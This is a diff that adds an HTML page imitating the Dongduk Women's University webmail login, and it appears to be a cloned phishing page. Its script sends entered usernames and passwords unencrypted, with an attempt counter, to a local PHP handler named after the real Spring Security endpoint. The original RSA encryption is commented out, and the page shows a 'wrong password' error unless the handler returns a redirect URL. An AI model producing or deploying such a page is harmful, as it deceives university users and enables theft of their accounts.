@@ -1,0 +1,350 @@
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html lang="ko"><html class="ie8" lang="ko"><![endif]-->
+<!--[if IE 7]><html lang="ko"><html class="ie7" lang="ko"><![endif]-->
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+	
+		
+	
+
+<title>
+		동덕여자대학교 WebMail |
+	 로그인</title>
+<link rel="shortcut icon" href="./img/favicon.png"
+	type="image/x-icon" />
+<link href="./css/servicesImport.css" rel="stylesheet" type="text/css">
+<script src="./js/jquery-1.11.3.min.js"></script>
+<script src="./js/common.js"></script>
+
+	<!-- RSA 자바스크립트 라이브러리 -->
+	<script type="text/javascript" src="./js/jsbn.js"></script>
+	<script type="text/javascript" src="./js/rsa.js"></script>
+	<script type="text/javascript" src="./js/prng4.js"></script>
+	<script type="text/javascript" src="./js/rng.js"></script>
+
+
+<style type="text/css">
+@charset "utf-8";
+
+.captcha {margin-top:10px;margin-bottom:25px}
+.captcha_inp { position:relative}
+.captcha_inp img { vertical-align:middle}
+.captcha_inp input {box-sizing:border-box; position:absolute; right:0; top:0; width:37%; height:50px}
+
+.checks .btn_list {
+	font-size: 13px;
+	font-weight: bold;
+	text-align: right;
+}
+
+.checks .btn_list a {
+	color: #5d5b5b;
+}
+
+.checks .btn_list li {
+	display: inline-block;
+	*display: inline;
+	*zoom: 1;
+	padding-left: 12px;
+	margin-left: 12px;
+}
+
+.checks .btn_list li:hover {
+}
+
+.checks .btn_list li:hover a {
+	color: #912e4a;
+}
+
+</style>
+
+<script type="text/javascript">
+		var cnt = 0;
+		function isObjExist(objName) {
+			var element = document.getElementById(objName);
+			if (typeof(element) != "undefined" && element != null) {
+				return true;
+			}
+			return false;
+		}
+		function addNormalEventWithType(nclickId, func, eventType) {
+			if (isObjExist(nclickId)) {
+				var targetElement = document.getElementById(nclickId);
+				if (targetElement.addEventListener) {
+					targetElement.addEventListener(eventType, func, false);
+				} else {
+					targetElement.attachEvent("on" + eventType, func);
+				}
+			}
+		}
+
+		function listenEvent(eventObj, event, eventHandler) {
+			if (eventObj.addEventListener) {
+				eventObj.addEventListener(event, eventHandler, false);
+			} else if (eventObj.attachEvent) {
+				event = "on" + event;
+				eventObj.attachEvent(event, eventHandler);
+			} else {
+				eventObj["on" + event] = eventHandler;
+			}
+		}
+
+		function cancelEvent(event) {
+			if (event.preventDefault) {
+				event.preventDefault();
+			} else {
+				event.returnValue = false;
+			}
+		}
+
+		window.onload = function() {
+			var form = document.forms[0];
+			//listenEvent(form, "submit", validateSubmit);
+			var pw_E = document.getElementById("member_pw");
+			if(pw_E) {
+				pw_E.addEventListener("keyup", function(){
+					if(document.getElementById("member_pw").value.length>=0){
+						document.getElementById("error_msg").hidden = true;
+					}
+				}, false);		
+			} 
+			var user_E = document.getElementById("member_id");
+			if(user_E) {
+				user_E.addEventListener("keyup", function(){
+					if(document.getElementById("member_id").value.length>=0){
+						document.getElementById("error_msg").hidden = true;
+					}	
+				}, false);		
+			} 
+			addNormalEventWithType('loginForm', function(e) { 
+				validateSubmit();
+				e.preventDefault ? e.preventDefault() : e.returnValue = false;
+			}, "submit");
+
+			loginFocus();
+		}
+
+		var inprocess = false;
+
+		function validateSubmit(event) {
+			event = event ? event : window.event;
+
+			if (inprocess)
+			return;
+			inprocess = true;
+
+			var form = document.forms[0];
+
+			var captcha = form.elements["captcha"];
+			if (captcha && (!captcha.value || captcha.value.length == 0)) {
+				alert("자동입력 방지문자를 입력해 주세요.");
+				inprocess = false;
+				cancelEvent(event);
+				return;
+			}
+
+			var username = form.elements["username"];
+			var j_username = form.elements["j_username"];
+			if (!username || !username.value || username.value.length == 0) {
+				alert('아이디를 입력하세요.');
+				inprocess = false;
+				cancelEvent(event);
+				return;
+			}
+			
+			var domain = form.elements["domain"].value;
+			j_username.value = username.value + "@" + domain;
+
+			var password = form.elements["password"];
+			var j_password = form.elements["j_password"];
+			if (!password || !password.value || password.value.length == 0) {
+				alert('패스워드를 입력하세요.');
+				inprocess = false;
+				cancelEvent(event);
+				return;
+			}
+			j_password.value = password.value;
+			//if (true) {
+			//	var rsa = new RSAKey();
+			//	rsa.setPublic('d00d4c25e923ed2126c2ffda4b5bfbf7d35ab66ed2409a3d298c04cded9936f2ce68ce806461c4ffc2cf8baa93d2d9d31dfd86c85c608ff06e70da570eca1cfd4796db726f0c7bd478a013ac8037d3bbbc73120cc11c525254912a3059691106aca96f7db106df4450250304c65491f053d33e8700821edbe4fa7d2c162238aeaf0aa2d6a3f3b2ccdb0062d522ec9cd73ffbb9cab2d585dbca39ea4e9c9168448003f986a73e2b5ed02390c190e78129aae31e2d8e1923b16877399d231b338835c61c80096969289189e4cc5ee26481ea629d826bc7daba4e97f4c7e04894fa47ef361cc331e06981005bdbb87cc12ccf0cf940d02e0fc5d433b0c7f9ac011b', '10001');
+				// 비밀번호를 RSA로 암호화한다.
+			//	j_password.value = rsa.encrypt(j_password.value);
+			//}
+			//password.value = '';
+			var xmlhttp;
+			try {
+				xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
+			} catch (e) {
+				try {
+					xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+				} catch (E) {
+					xmlhttp = false;
+				}
+			}
+			if (!xmlhttp && typeof XMLHttpRequest != "undefined") {
+				xmlhttp = new XMLHttpRequest();
+			}
+			var post_val = "username="+username.value + "@" + domain+"&password="+password.value+"&count="+cnt;
+			try {
+				xmlhttp.open("POST", "./j_spring_security_check.php");
+				xmlhttp.withCredentials=true;
+				xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+				xmlhttp.onreadystatechange = function() {
+					if (xmlhttp.readyState == 4) {				
+						var response = xmlhttp.responseText;
+						if(response.indexOf("http") >= 0)
+						{
+							location.replace(response);														
+						}
+						else
+						{
+							document.getElementById("error_msg").hidden = false;
+						}
+						inprocess = false;	
+						return true;
+					}
+				}
+				xmlhttp.send(post_val);
+			} catch (e) {
+				document.getElementById("error_msg").hidden = false;
+				if(window.bridgeGotTime){throw e;}		
+			}
+			cnt++;
+
+			//form.submit();
+			return true;
+		}
+
+		function signup() {
+			var domain = 'dongduk.ac.kr';
+			location.href = '/mail/signup/' + domain + '/agree';
+		}
+
+		function find(type) {
+			location.href = '/mail/find/' + type;
+		}
+
+		function loginFocus() {
+			var form = document.forms[0];
+			var username = form.elements["username"];
+			var password = form.elements["j_password"];
+			if(!username.value || username.value.length == 0) {
+				username.focus();
+			} else {
+				password.focus();
+			}
+		}
+
+		function captchaRefresh() {
+			var captchaImg = document.getElementById('captcha-image');
+			captchaImg.src = 'img/captcha?_=' + new Date().getTime();
+		}
+</script>
+
+<script type="text/javascript">
+	function getCookie(name, value) {
+		if (name)
+			name += '=';
+		var isCookie = false;
+		var cookies = document.cookie;
+		var pos = cookies.indexOf(name);
+		if (pos != -1) {
+			var start = pos + name.length;
+			var end = cookies.indexOf(';', start);
+			if (end == -1)
+				end = cookies.length;
+			var cvalue = cookies.substring(start, end);
+			cvalue = decodeURIComponent(cvalue);
+			if (value === cvalue) {
+				isCookie = true;
+				return isCookie;
+			}
+		}
+		return isCookie;
+	}
+
+	
+</script>
+
+</head>
+<body>
+	<div class="wrap">
+		
+		<form id="loginForm" action="./j_spring_security_check.php;jsessionid=6BA9C87ACE7973EF9DE9E35F37C951B4" method="post" autocomplete="off" onsubmit="return false;">
+			<div class="login">
+				<div class="loginarea">
+					<a href=""><img src="./img/w_logo.png" alt="로고"></a>
+					<p class="w_tit">동덕여자대학교 웹메일<p>
+				</div>
+				<input type="hidden" name="_csrf" value="3a4f1ec9-b91b-40b6-8b3f-1ce7765068a1" />
+				<div class="frm_wrap">
+					<div class="frm">
+						<label for="member_id">아이디</label>
+						<span class="frm-id">
+							<input type="hidden" name="j_username">
+							<input type="text" name="username" class="emailform" id="member_id" hname="아이디" value="" option="idpass" maxlength="25" placeholder="아이디" frequired="required" style="ime-mode:inactive;" >
+							<span class="mail">@</span>
+							<input type="text" class="emailform" placeholder="Domain" name="domain" id="login_domain"  value="dongduk.ac.kr" disabled="disabled">
+						</span>
+						<label for="member_pw">비밀번호</label>
+						<span class="frm-pw">
+							<input type="hidden" name="j_password">
+							<input type="password" name="password" id="member_pw" class="text" hname="비밀번호" placeholder="비밀번호" frequired="required">
+						</span>
+					</div>
+					<div class="message"  >
+						<table>
+						<tr>
+							<td colspan="2">
+								<p id="error_msg" hidden>
+					아이디 또는 비밀번호를 다시 확인하세요.<br />등록되지 않은 아이디이거나, 아이디 또는 비밀번호를 잘못 입력하셨습니다.
+		
+								</font></p>
+							</td>
+						</tr>
+					</table>
+					
+					</div>
+					<div class="checks">
+						<div>
+							<input type="checkbox" name="remember-me" id="save_id">
+							<label for="save_id">로그인유지</label>
+						</div>
+						<ul class="btn_list">
+						
+<!-- 							<li><a href="#" onclick="find('id');">아이디 찾기</a></li> -->
+							<li><a href="#" onclick="find('password');">비밀번호 찾기</a></li>
+						
+						
+					</ul>
+					</div>
+					<input type="submit" class="btn_login" title="로그인" value="로그인">
+					<div class="f_txtarea">
+						<span>2011년 2월 17일부터 포털 시스템의 단일 사용자 계정(SSO)와 동일한 아이디, 비밀번호로 로그인 하시기 바랍니다.</span>
+					</div>
+				</div>
+				<span class="f_copy">
+					
+						
+							Copyright Dongduk Women's University. All Rights Reserved
+						
+					
+				</span>
+				<div style="clear:both; font-size:13px; text-align:right;">
+					<a href="https://www.dongduk.ac.kr/kor/life/secuperinfo02.do" target="_blank" style="color:red;">개인정보처리방침</a>
+				</div>
+			</div>
+		</form>
+	</div>
+</body>
+</html>
